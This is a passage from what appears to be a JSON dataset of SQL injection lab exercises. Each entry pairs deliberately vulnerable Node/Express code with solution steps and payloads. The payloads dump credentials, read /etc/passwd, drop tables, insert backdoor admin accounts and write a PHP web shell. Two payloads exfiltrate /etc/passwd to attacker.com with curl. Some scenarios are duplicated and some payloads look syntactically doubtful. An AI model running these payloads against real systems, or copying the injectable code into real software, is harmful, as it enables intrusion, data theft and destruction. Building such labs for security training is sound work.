    "srcCode": "app.post('/query', (req, res) => {\n  const { filters } = req.body;\n  let where = \"data @> '\"\";\n  \n  if (filters.$where) {\n    where += ` AND ${eval(filters.$where)}`; // Dangerous eval\n  }\n  \n  const query = `SELECT * FROM documents WHERE ${where}`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "{\"$where\": \"1); SELECT * FROM pg_user--\"}",
      "{\"$where\": \"1); COPY (SELECT * FROM secrets) TO '/tmp/leak'--\"}",
      "{\"$where\": \"1); SELECT pg_read_file('/etc/passwd')--\"}"
    ]
  },
  {
    "Lab scenario": "SQL injection in JWT claim processing",
    "Lab Description": "The application extracts organization_id from JWT tokens and uses it directly in SQL queries with JSON path operations. To solve: Forge a JWT with malicious JSON path traversal to access all organizations' data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Decode JWT and identify organization_id claim",
      "Craft token with: {\"organization_id\":\"']'::jsonb) UNION SELECT 1,2,3,table_name FROM information_schema.tables--\"}",
      "Use PostgreSQL JSON operators: {\"organization_id\":\"' @> '{\\\"is_admin\\\":true}'::jsonb--\"}",
      "Extract other organizations' data via path traversal",
      "Access admin functionality through claim injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/data', (req, res) => {\n  const token = jwt.verify(req.headers.authorization, SECRET);\n  const query = `\n    SELECT * FROM org_data \n    WHERE data::jsonb @> '{\"org_id\":${token.organization_id}}'::jsonb`;\n  \n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "']'::jsonb) UNION SELECT 1,2,3,table_name FROM information_schema.tables--",
      "' @> '{\"is_admin\":true}'::jsonb--",
      "']'::jsonb); SELECT pg_read_file('/etc/passwd')--"
    ]
  },
  {
    "Lab scenario": "SQL injection in MongoDB aggregation pipeline",
    "Lab Description": "An analytics dashboard converts MongoDB aggregation stages to SQL queries unsafely. The $match and $project stages are vulnerable. To solve: Break out of aggregation syntax to execute raw SQL against the underlying database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable $match parameter",
      "Break pipeline context with: {\"$match\": {\"$expr\": {\"$eq\": [1, \"1); SELECT 1--\"]}}}",
      "Use JavaScript evaluation: {\"$where\": \"1); SELECT * FROM users--\"}",
      "Execute stacked queries via $function stage",
      "Dump entire database through SQL exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/aggregate', (req, res) => {\n  const pipeline = req.body;\n  const query = convertAggregationToSQL(pipeline); // Vulnerable conversion\n  \n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "{\"$match\": {\"$expr\": {\"$eq\": [1, \"1); SELECT 1--\"]}}}",
      "{\"$project\": {\"test\": \"$' UNION SELECT 1,2,3--\"}}",
      "{\"$function\": {\"body\": \"function() { return SQL.execute('SELECT * FROM users'); }\"}}"
    ]
  },
  {
    "Lab scenario": "SQL injection in CSV export via field terminators",
    "Lab Description": "A reporting feature exports query results to CSV using unsafe field terminators. The application allows control over delimiter characters. To solve: Inject SQL through field terminators to execute commands when the CSV is processed.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept CSV export request",
      "Inject malicious field terminator: INTO OUTFILE '/tmp/test' FIELDS TERMINATED BY '=CMD|'",
      "Include command execution: LINES TERMINATED BY '/C calc.exe!'",
      "Trigger file processing on server",
      "Verify command execution through side effects"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export', (req, res) => {\n  const { delimiter } = req.query;\n  const query = `\n    SELECT * FROM reports \n    INTO OUTFILE '/tmp/report.csv' \n    FIELDS TERMINATED BY '${delimiter || \",\"}'`;\n  \n  db.query(query, () => {\n    res.download('/tmp/report.csv');\n  });\n});",
    "payloads": [
      "'=CMD|' LINES TERMINATED BY '/C calc.exe!'--",
      "0x3d434d447c204c494e4553205445524d494e4154454420425920272f432063616c632e65786521--",
      "'\\' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/backdoor.php' LINES TERMINATED BY '<?php system($_GET[\\'cmd\\']); ?>'--"
    ]
  },
  {
    "Lab scenario": "SQL injection in dynamic materialized view refresh",
    "Lab Description": "A data warehouse application refreshes materialized views using unsafe dynamic SQL. The WITH DATA clause is injectable. To solve: Exploit refresh timing to perform blind data extraction.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify materialized view refresh endpoint",
      "Inject WITH clause: WITH DATA OR 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
      "Use time-based inference for blind extraction",
      "Measure refresh duration to infer query results",
      "Reconstruct database schema through timing differences"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/refresh-view', (req, res) => {\n  const { viewName } = req.body;\n  const query = `REFRESH MATERIALIZED VIEW ${viewName} WITH DATA`;\n  \n  db.query(query, (err) => {\n    if (err) return res.status(500).send(err.message);\n    res.send('View refreshed');\n  });\n});",
    "payloads": [
      "sales_data WITH DATA OR 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
      "inventory WITH NO DATA); SELECT pg_sleep(5)--",
      "customer_data WITH DATA); COPY (SELECT * FROM passwords) TO '/tmp/leak'--"
    ]
  },
  {
    "Lab scenario": "SQL injection in full-text search parser",
    "Lab Description": "A search engine uses PostgreSQL tsquery syntax directly from user input. The application fails to sanitize special operators. To solve: Break out of text search context to execute arbitrary queries.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable search parameter",
      "Break tsquery syntax with: ' OR '1'='1'::tsquery",
      "Convert to raw SQL: ') OR 1=1--",
      "Leverage full-text search functions for data extraction",
      "Dump document contents through search vectors"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { q } = req.query;\n  const query = `\n    SELECT * FROM documents \n    WHERE to_tsvector(content) @@ to_tsquery('${q}')`;\n  \n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR '1'='1'::tsquery",
      "') OR 1=1--",
      "')) UNION SELECT 1,2,3,current_database()--"
    ]
  },
  {
    "Lab scenario": "SQL injection in array literal generation",
    "Lab Description": "A geospatial application builds PostGIS queries with unsafe array concatenation. The ARRAY[] constructor is vulnerable. To solve: Break out of array context to access PostGIS functions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable coordinates parameter",
      "Break array syntax with: 1]::text) OR 1=1--",
      "Access PostGIS functions: 1]::text) OR ST_AsText(ST_Transform(ST_GeomFromText('POINT(0 0)',4326),3785))--",
      "Execute system commands via PostGIS external modules",
      "Dump all spatial data through injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/nearby', (req, res) => {\n  const { coords } = req.query;\n  const query = `\n    SELECT * FROM locations \n    WHERE ST_Contains(\n      ST_Polygon('ARRAY[${coords}]'::float8[]),\n      point\n    )`;\n  \n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "1]::text) OR 1=1--",
      "1]::text); SELECT ST_AsText(geom) FROM sensitive_locations--",
      "1]::text); COPY (SELECT * FROM users) TO PROGRAM 'curl attacker.com/?leak=$(base64 /etc/passwd)'--"
    ]
  },
  {
    "Lab scenario": "SQL injection in window function frame clause",
    "Lab Description": "An analytics application allows custom window frame specifications. The ROWS/RANGE clause is vulnerable. To solve: Exploit frame boundary definitions to execute arbitrary SQL.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable frame parameter",
      "Break frame syntax with: BETWEEN 1 PRECEDING AND 1) OR 1=1--",
      "Inject UNION queries via frame boundaries",
      "Access window function internals for data extraction",
      "Dump all analytical data through injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics', (req, res) => {\n  const { frame } = req.query;\n  const query = `\n    SELECT id, \n      SUM(value) OVER (ORDER BY date ${frame || 'ROWS 1 PRECEDING'})\n    FROM metrics`;\n  \n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "BETWEEN 1 PRECEDING AND 1) OR 1=1--",
      "ROWS 1 PRECEDING) UNION SELECT 1,table_name FROM information_schema.tables--",
      "RANGE INTERVAL '1' DAY) OR EXISTS(SELECT * FROM passwords)--"
    ]
  },
  {
    "Lab scenario": "SQL injection in recursive CTE anchor member",
    "Lab Description": "A hierarchical data explorer builds recursive CTEs with user input in the anchor member. The WITH RECURSIVE clause is vulnerable. To solve: Break recursion to execute stacked queries.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable hierarchy root parameter",
      "Break CTE syntax with: 1) UNION SELECT 1,2,3 FROM users--",
      "Inject malicious recursive term",
      "Exploit query depth limits for blind extraction",
      "Dump organizational hierarchy through injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/hierarchy', (req, res) => {\n  const { root } = req.query;\n  const query = `\n    WITH RECURSIVE tree AS (\n      SELECT * FROM nodes WHERE id = ${root}\n      UNION ALL\n      SELECT n.* FROM nodes n JOIN tree t ON n.parent = t.id\n    ) SELECT * FROM tree`;\n  \n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "1) UNION SELECT 1,2,3 FROM users--",
      "1); INSERT INTO backdoor VALUES ('attacker','pass')--",
      "1 OR EXISTS(SELECT * FROM sensitive_nodes)--"
    ]
  },
  {
    "Lab scenario": "Error-based SQL injection in E-Commerce product page",
    "Lab Description": "The product details page builds SQL queries using product ID directly from the URL without sanitization. Errors are exposed in the response. To solve: Use error-based SQL injection to leak database version and table structure.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit /product?id=1",
      "Inject payload: 1' AND 1=CONVERT(int, @@version)--",
      "Observe SQL error with version info",
      "Extract table names with: 1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
      "Document database structure"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/product', (req, res) => {\n  const id = req.query.id;\n  const query = `SELECT * FROM products WHERE id = '${id}'`;\n  db.query(query, (err, result) => {\n    if (err) res.send(err.message); // Error leakage\n    else res.json(result);\n  });\n});",
    "payloads": [
      "1' AND 1=CONVERT(int, @@version)--",
      "1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--"
    ]
  },
  {
    "Lab scenario": "Union-based SQL injection in Feedback form",
    "Lab Description": "The feedback form includes a name field used in a SQL query without filtering. The application returns query results directly. To solve: Use UNION-based SQL injection to extract admin credentials and session tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback with name: ' UNION SELECT null,username,password FROM users--",
      "Determine correct column count first with ORDER BY",
      "Extract session tokens with: ' UNION SELECT session_id,null FROM user_sessions--",
      "Hijack admin session using stolen token"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/feedback', (req, res) => {\n  const { name, message } = req.body;\n  const query = `INSERT INTO feedback (name, message) VALUES ('${name}', '${message}') RETURNING name`;\n  db.query(query, (err, result) => {\n    res.send(`Thanks for your feedback, ${result.rows[0].name}`);\n  });\n});",
    "payloads": [
      "' UNION SELECT null,username,password FROM users--",
      "' UNION SELECT 1,version(),3--"
    ]
  },
  {
    "Lab scenario": "Second-order SQL injection in User Settings",
    "Lab Description": "The app stores user profile data directly into the database and uses it later in SQL queries. The stored input is not sanitized. To solve: Inject SQL in a stored field and trigger it during subsequent profile operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Change username to: admin'--",
      "Trigger profile update to execute stored payload",
      "Verify admin privileges were acquired",
      "Check database logs for injection evidence"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/updateProfile', (req, res) => {\n  const { username } = req.body;\n  const id = req.session.userId;\n  db.query(`UPDATE users SET username='${username}' WHERE id=${id}`);\n  res.send('Profile updated');\n});\n\napp.get('/profile', (req, res) => {\n  const query = `SELECT * FROM users WHERE username='${req.session.username}'`;\n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "admin'--",
      "'; UPDATE users SET is_admin=1 WHERE id=1--"
    ]
  },
  {
    "Lab scenario": "SQL injection in DELETE endpoint of Project Manager",
    "Lab Description": "The project deletion feature takes a project ID directly from URL parameters and performs a deletion without validation. To solve: Use SQL injection to delete critical tables and disrupt application functionality.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Call /deleteProject?id=1; DROP TABLE audit_logs--",
      "Verify logs table was deleted",
      "Attempt to access audit functionality",
      "Document system disruption"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.delete('/deleteProject', (req, res) => {\n  const id = req.query.id;\n  db.query(`DELETE FROM projects WHERE id = ${id}`);\n  res.send('Project deleted');\n});",
    "payloads": [
      "1; DROP TABLE audit_logs--",
      "1; TRUNCATE TABLE user_sessions--"
    ]
  },
  {
    "Lab scenario": "Blind SQL injection via cookie in Employee Portal",
    "Lab Description": "The session token cookie is included in a query without sanitization. The response does not change but time delays can be observed. To solve: Use blind time-based injection to retrieve admin credentials character by character.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send request with cookie: session=abc' OR IF(1=1,SLEEP(5),0)--",
      "Measure response time to confirm injection",
      "Extract password hash with: ' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>50,SLEEP(5),0)--",
      "Reconstruct full hash through binary search"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.use((req, res, next) => {\n  const session = req.cookies.session;\n  const q = `SELECT * FROM sessions WHERE token='${session}'`;\n  db.query(q);\n  next();\n});",
    "payloads": [
      "abc' OR SLEEP(5)--",
      "' OR IF((SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%'),SLEEP(5),0)--"
    ]
  },
  {
    "Lab scenario": "SQL injection in Inventory filter dropdown",
    "Lab Description": "The inventory filter takes user input and builds the WHERE clause directly. No input validation is performed. To solve: Inject SQL to extract supplier pricing data and competitor information.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit /inventory?filter=electronics",
      "Change to: electronics' UNION SELECT supplier_id,price FROM supplier_pricing--",
      "Extract competitor pricing data",
      "Document sensitive business information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/inventory', (req, res) => {\n  const filter = req.query.filter || 'all';\n  const q = `SELECT item_name,description FROM items WHERE category='${filter}'`;\n  db.all(q, (err, rows) => res.json(rows));\n});",
    "payloads": [
      "electronics' UNION SELECT supplier_id,price FROM supplier_pricing--",
      "' UNION SELECT credit_card,expiry FROM supplier_payments--"
    ]
  },
  {
    "Lab scenario": "SQL injection in Registration endpoint's email check",
    "Lab Description": "The registration system checks if the email exists using an unsanitized query. The response shows different errors based on query results. To solve: Use SQLi to create a privileged account and bypass authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send registration request with email: test@example.com'; INSERT INTO users (email,password,role) VALUES ('admin@hacked.com','pwned','superadmin')--",
      "Verify account creation in database",
      "Login with new privileged credentials",
      "Access restricted admin functionality"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/checkEmail', (req, res) => {\n  const { email } = req.body;\n  db.query(`SELECT * FROM users WHERE email = '${email}'`, (err, rows) => {\n    if (rows.length) res.json({ available: false });\n    else res.json({ available: true });\n  });\n});",
    "payloads": [
      "test@example.com'; INSERT INTO users (email,password,role) VALUES ('admin@hacked.com','pwned','superadmin')--",
      "'; UPDATE users SET role='admin' WHERE email='existing@user.com'--"
    ]
  },
  {
    "Lab scenario": "Boolean-based SQL injection in Newsletter subscription",
    "Lab Description": "The newsletter form processes email input in a SQL query. Application returns different messages based on whether the email exists. To solve: Use Boolean SQLi to enumerate all valid user emails.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit: ' OR EXISTS(SELECT 1 FROM users WHERE email LIKE '%@company.com')--",
      "Confirm if any company emails exist",
      "Brute-force specific emails: ' OR email='ceo@company.com'--",
      "Build complete user email list"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/subscribe', (req, res) => {\n  const { email } = req.body;\n  const query = `SELECT * FROM subscribers WHERE email='${email}'`;\n  db.query(query, (err, rows) => {\n    if (rows.length) res.send('Already subscribed');\n    else res.send('Thanks for subscribing!');\n  });\n});",
    "payloads": [
      "' OR EXISTS(SELECT 1 FROM users WHERE email LIKE '%@company.com')--",
      "' OR email='admin@company.com'--"
    ]
  },
  {
    "Lab scenario": "SQL injection via search suggestion API",
    "Lab Description": "The suggestion feature uses search terms directly in SQL. Output is visible to users in real-time. To solve: Exploit the injection to dump all user credentials and session tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Call /suggest?q=a",
      "Inject: a%' UNION SELECT CONCAT(username,':',password) FROM users--",
      "Observe credential suggestions in response",
      "Extract all sensitive data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/suggest', (req, res) => {\n  const q = req.query.q || '';\n  const query = `SELECT term FROM search_terms WHERE term LIKE '${q}%' LIMIT 5`;\n  db.all(query, (err, rows) => res.json(rows));\n});",
    "payloads": [
      "a%' UNION SELECT CONCAT(username,':',password) FROM users--",
      "x%' UNION SELECT credit_card FROM payments--"
    ]
  },
  {
    "Lab scenario": "SQL injection in admin panel IP logger",
    "Lab Description": "Admin panel logs visitor IPs directly into SQL without escaping. The application is not vulnerable to output-based SQLi, but the query is injectable. To solve: Inject SQL to create a web shell for persistent access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Spoof IP address to: 1.1.1.1'; SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
      "Trigger admin visit to log malicious IP",
      "Access created web shell at /shell.php",
      "Execute system commands through web shell"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;\n  const logQuery = `INSERT INTO ip_logs (ip, visited_at) VALUES ('${ip}', NOW())`;\n  db.query(logQuery);\n  next();\n});",
    "payloads": [
      "1.1.1.1'; SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
      "'; COPY (SELECT * FROM sensitive_data) TO '/var/www/html/leak.csv'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in GraphQL Enumeration Query",
    "Lab Description": "A GraphQL endpoint exposes database introspection through a vulnerable enum field. The application fails to sanitize enum values used in raw SQL. To solve: Exploit the enum parameter to extract database schema information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send GraphQL introspection query to identify enum fields",
      "Craft malicious enum value: ' UNION SELECT table_name FROM information_schema.tables--",
      "Use aliases to bypass field restrictions",
      "Extract column definitions through error messages",
      "Map complete database structure"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const { GraphQLEnumType } = require('graphql');\n\nconst DbEnumType = new GraphQLEnumType({\n  name: 'DbTables',\n  values: {\n    USERS: { value: 'users' },\n    POSTS: { value: 'posts' }\n  }\n});\n\nconst queryType = new GraphQLObjectType({\n  name: 'Query',\n  fields: {\n    tableData: {\n      type: new GraphQLList(StringType),\n      args: { table: { type: DbEnumType } },\n      resolve: (_, { table }) => {\n        return db.query(`SELECT * FROM ${table}`); // Vulnerable\n      }\n    }\n  }\n});",
    "payloads": [
      "{ tableData(table: \"users' UNION SELECT table_name FROM information_schema.tables--\") }",
      "{ tableData(table: \"posts'||(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'))\" }"
    ]
  },
  {
    "Lab scenario": "NoSQL to SQL Injection in Hybrid Document Query",
    "Lab Description": "An application converts MongoDB-style queries to SQL for reporting. The $match operator is vulnerable to SQL injection during conversion. To solve: Break out of document context to execute raw SQL commands.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable $match parameter in reporting API",
      "Break query context: {\"$match\":{\"$expr\":{\"$eq\":[1,\"1); SELECT 1--\"]}}}",
      "Execute stacked queries via $function operator",
      "Dump database through OOB exfiltration",
      "Verify data extraction through side channels"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/reports', (req, res) => {\n  const { filters } = req.body;\n  const sql = convertMongoToSQL(filters); // Vulnerable conversion\n  db.query(sql, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "{\"$match\":{\"$expr\":{\"$eq\":[1,\"1); SELECT * FROM users--\"]}}}",
      "{\"$project\":{\"x\":\"$' UNION SELECT 1,2,3 FROM information_schema.tables--\"}}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Geospatial Function Argument",
    "Lab Description": "A mapping application uses unsanitized user input in PostGIS functions. The ST_Contains parameter is vulnerable to injection. To solve: Exploit geometry parsing to execute system commands via PostGIS extensions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable coordinate parameter in map query",
      "Break WKT context with: POLYGON((0 0,1 1))); SELECT pg_read_file('/etc/passwd')--",
      "Load malicious PostGIS extension",
      "Execute OS commands via extension functions",
      "Exfiltrate data through network calls"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/within-boundary', (req, res) => {\n  const coords = req.query.coords;\n  const query = `SELECT * FROM locations WHERE ST_Contains(\n    ST_GeomFromText('POLYGON((${coords}))'),\n    point\n  )`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "0 0,100 100)); SELECT pg_read_file('/etc/passwd')--",
      "0 0,1 1)); COPY (SELECT * FROM passwords) TO PROGRAM 'curl attacker.com/?leak=$(base64 /etc/passwd)'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Full-Text Search Dictionary",
    "Lab Description": "A search application allows custom dictionary configuration through URL parameters. The dictionary name is used unsafely in ts_parse function. To solve: Break out of dictionary context to execute arbitrary queries.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable dictionary parameter",
      "Break dictionary syntax: english' UNION SELECT current_user--",
      "Access full-text search internals",
      "Extract document vectors containing sensitive data",
      "Reconstruct documents from search index"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/parse-text', (req, res) => {\n  const { text, dict } = req.query;\n  const query = `SELECT ts_parse('${dict}', '${text}')`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "english' UNION SELECT current_user--",
      "simple' FROM ts_debug('english', 'test') WHERE alias='word' AND lexeme='test')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Array Aggregation Function",
    "Lab Description": "A reporting tool builds array_agg queries with user-controlled sort orders. The ORDER BY clause within array_agg is vulnerable. To solve: Exploit array construction to leak data through error messages.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable array aggregation endpoint",
      "Inject through ORDER BY clause: array_agg(id ORDER BY 1/(SELECT CASE WHEN current_user='admin' THEN 1 ELSE 0 END))",
      "Trigger divide-by-zero errors for boolean tests",
      "Extract data through error differentials",
      "Reconstruct sensitive information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/user-stats', (req, res) => {\n  const { sort } = req.query;\n  const query = `SELECT array_agg(user_id ORDER BY ${sort}) FROM activity`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "1/(SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')=1 THEN 1 ELSE 0 END)",
      "1, (SELECT password FROM users WHERE username='admin' LIMIT 1)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Window Function Frame",
    "Lab Description": "An analytics dashboard allows custom window frame specifications. The ROWS BETWEEN clause is vulnerable to injection. To solve: Break out of window frame context to access underlying tables.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable frame parameter",
      "Break frame syntax: ROWS BETWEEN 1 PRECEDING AND 1) UNION SELECT 1,2,3--",
      "Access window function partition columns",
      "Exfiltrate data through aggregate functions",
      "Bypass row visibility controls"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/rolling-avg', (req, res) => {\n  const { frame } = req.query;\n  const query = `\n    SELECT date, \n      AVG(value) OVER (ORDER BY date ${frame || 'ROWS 7 PRECEDING'})\n    FROM metrics`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "ROWS BETWEEN 1 PRECEDING AND 1) UNION SELECT 1,2,3 FROM users--",
      "ROWS UNBOUNDED PRECEDING) EXECUTE IMMEDIATE 'COPY (SELECT * FROM secrets) TO ''/tmp/leak.csv'''--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in JSON Path Query",
    "Lab Description": "A document store exposes JSON path queries that get converted to SQL. The jsonpath parameter is vulnerable to injection. To solve: Break out of path context to execute raw SQL.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable jsonpath parameter",
      "Break path syntax: $.user') OR 1=1--",
      "Access JSON storage internals",
      "Extract all documents through path traversal",
      "Bypass document-level permissions"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-docs', (req, res) => {\n  const { path } = req.query;\n  const query = `\n    SELECT jsonb_path_query(doc, '${path}') \n    FROM documents`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "$.user') OR 1=1--",
      "$.user'')) FROM jsonb_array_elements(doc->'users') WHERE (doc->>'password') LIKE 'a%'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Materialized View Refresh",
    "Lab Description": "A data warehouse allows triggering materialized view refreshes with user-controlled parameters. The WITH DATA clause is vulnerable. To solve: Exploit refresh privileges to modify underlying data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify refresh endpoint with parameter",
      "Inject through WITH clause: sales_data WITH DATA); UPDATE users SET is_admin=true--",
      "Verify privilege escalation",
      "Access restricted functionality",
      "Cover tracks through view reconstruction"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/refresh-view', (req, res) => {\n  const { view, options } = req.body;\n  const query = `REFRESH MATERIALIZED VIEW ${view} ${options}`;\n  db.query(query, (err) => {\n    if (err) return res.status(500).send(err.message);\n    res.send('View refreshed');\n  });\n});",
    "payloads": [
      "sales_data WITH DATA); UPDATE users SET is_admin=true--",
      "inventory WITH NO DATA); COPY (SELECT * FROM passwords) TO '/tmp/leak'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Recursive CTE Base Case",
    "Lab Description": "A hierarchical data viewer builds recursive CTEs with user input in the anchor member. The WITH RECURSIVE clause is vulnerable. To solve: Break recursion to access arbitrary tables.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable root node parameter",
      "Break CTE syntax: 1) UNION SELECT 1,2,3 FROM passwords--",
      "Access recursive query internals",
      "Exfiltrate data through depth-limited recursion",
      "Bypass hierarchical access controls"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/org-chart', (req, res) => {\n  const { root } = req.query;\n  const query = `\n    WITH RECURSIVE hierarchy AS (\n      SELECT * FROM employees WHERE id = ${root}\n      UNION ALL\n      SELECT e.* FROM employees e\n      JOIN hierarchy h ON e.manager_id = h.id\n    ) SELECT * FROM hierarchy`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "1) UNION SELECT 1,2,3 FROM passwords--",
      "1 OR EXISTS(SELECT * FROM sensitive_departments)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Custom Aggregate Function",
    "Lab Description": "An analytics application registers custom aggregate functions that use unsanitized input. The final function parameter is vulnerable. To solve: Break out of aggregate context to execute commands.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable aggregate function",
      "Break function syntax: my_agg(1) FROM (SELECT 1) x) OR 1=1--",
      "Access aggregate function internals",
      "Execute commands through extension functions",
      "Bypass aggregation constraints"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/custom-stats', (req, res) => {\n  const { param } = req.query;\n  const query = `SELECT my_custom_agg(${param}) FROM metrics`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "1) FROM (SELECT 1) x) OR 1=1--",
      "1); SELECT pg_read_file('/etc/passwd')--"
    ]
  },
  {
    "Lab scenario": "SQL injection in mobile app feedback submission",
    "Lab Description": "A mobile app sends user feedback via a POST request. The backend inserts feedback into the database without sanitizing inputs and returns the inserted record. To solve: Use SQL injection to extract usernames and passwords from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture POST /feedback request",
      "Modify 'feedback' parameter to: test'); SELECT username,password FROM users--",
      "Observe response containing leaked credentials",
      "Refine payload to target specific admin accounts",
      "Verify extracted credentials by attempting login"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\napp.post('/feedback', (req, res) => {\n  const comment = req.body.feedback;\n  const query = `INSERT INTO feedback (text) VALUES ('${comment}') RETURNING *`;\n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "test'); SELECT username,password FROM users--",
      "test'); UNION SELECT null,table_name FROM information_schema.tables--"
    ]
  },
  {
    "Lab scenario": "SQL injection in newsletter subscription email field",
